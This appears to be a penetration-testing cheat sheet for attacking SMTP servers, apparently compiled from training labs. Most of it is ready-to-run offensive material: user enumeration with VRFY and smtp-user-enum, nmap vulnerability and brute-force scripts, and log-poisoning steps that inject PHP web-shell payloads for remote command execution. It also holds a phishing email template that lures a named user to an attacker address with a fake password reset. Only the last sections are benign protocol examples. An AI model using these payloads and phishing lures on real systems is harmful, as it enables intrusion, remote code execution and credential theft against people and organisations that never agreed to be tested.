## CHECKS
```md
# Check for user enumeration  
# Check version for exploits  
```
## ENUMERATION
```md
sudo telnet $ip 25
# Verify username
VRFY root                            
# Login using Username
USER username               
# Login using Password
PASS password         
# Return Available Mail by number 
RETR 1       
RETR 2
```

## USER ENUMERATION
```md
# MANUAL WAY 
nc -nvv $ip 25  
VRFY root  
(exists if user is replied as "250 Georgia<Georgia@>")  
(doesn't exist if user is replied as "551 user not local")  
  
# AUTOMATED WAY  
sudo apt install smtp-user-enum -y
sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
sudo smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip
sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip
```
## NMAP SMTP
```md
# VIEW SCRIPTS
ls -la /usr/share/nmap/scripts/*smtp*

# SMTP SCRIPTS
/usr/share/nmap/scripts/smtp-brute.nse
/usr/share/nmap/scripts/smtp-commands.nse
/usr/share/nmap/scripts/smtp-enum-users.nse
/usr/share/nmap/scripts/smtp-ntlm-info.nse
/usr/share/nmap/scripts/smtp-open-relay.nse
/usr/share/nmap/scripts/smtp-strangeport.nse
/usr/share/nmap/scripts/smtp-vuln-cve2010-4344.nse
/usr/share/nmap/scripts/smtp-vuln-cve2011-1720.nse
/usr/share/nmap/scripts/smtp-vuln-cve2011-1764.nse

sudo nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```
## SMTP LOG POISONING
```md
# NETCAT
nc -nvv $ip 25    

# TELNET
telnet $ip 25  
  
MAIL FROM:<myuser@gmail.com>  
RCPT TO:<?php system($_GET['c']); ?>  

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`

# SEND MAIL - PHISING
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: Password reset process
Hi Brian,
Please follow this link to reset your password: http://192.168.49.211/                              
Regards,
.
QUIT
```
## NTLM Auth - Information disclosure
```md
# NMAP 
sudo nmap -p 25 --script smtp-ntlm-info.nse $ip

# MANUAL
root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
## CONFIG FILES
```bash
sendmail.cf
submit.cf
```
## EXAMPLE
```bash
HELO or EHLO initiates an SMTP session
MAIL FROM specifies the sender’s email address
RCPT TO specifies the recipient’s email address
DATA indicates that the client will begin sending the content of the email message
. is sent on a line by itself to indicate the end of the email message
```
## COMPOSE AND SEND MAIL - EXAMPLE
```bash
user@TryHackMe$ telnet 10.10.212.122 25
Trying 10.10.212.122...
Connected to 10.10.212.122.
Escape character is '^]'.
220 example.thm ESMTP Exim 4.95 Ubuntu Thu, 27 Jun 2024 16:18:09 +0000
HELO client.thm
250 example.thm Hello client.thm [10.11.81.126]
MAIL FROM: <user@client.thm>
250 OK
RCPT TO: <strategos@server.thm>
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
From: user@client.thm
To: strategos@server.thm
Subject: Telnet email

Hello. I am using telnet to send you an email!
.
250 OK id=1sMrpq-0001Ah-UT
QUIT
221 example.thm closing connection
Connection closed by foreign host.
```
